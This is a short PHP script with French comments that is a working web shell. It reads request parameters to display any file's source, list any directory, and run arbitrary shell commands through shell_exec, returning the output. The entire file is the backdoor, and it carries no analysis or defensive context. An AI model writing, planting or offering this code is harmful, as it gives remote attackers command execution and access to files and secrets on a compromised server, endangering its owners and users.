<?php
// cat
if(isset($_GET['f'])){
    highlight_file($_GET['f']);          // affiche le code source d’un fichier
// cat 2
} elseif (isset($_GET['f2'])) {
    echo nl2br(htmlspecialchars(file_get_contents($_GET['f2']))); // affiche aussi le code source mais avec nl2br
// ls
} elseif(isset($_GET['ls'])){
    print_r(scandir($_GET['ls']));      // liste le contenu d’un répertoire
// lancer shell
} elseif(isset($_GET['c'])){
    print_r(shell_exec($_GET['c']));    // exécute une commande shell et renvoie le résultat
}

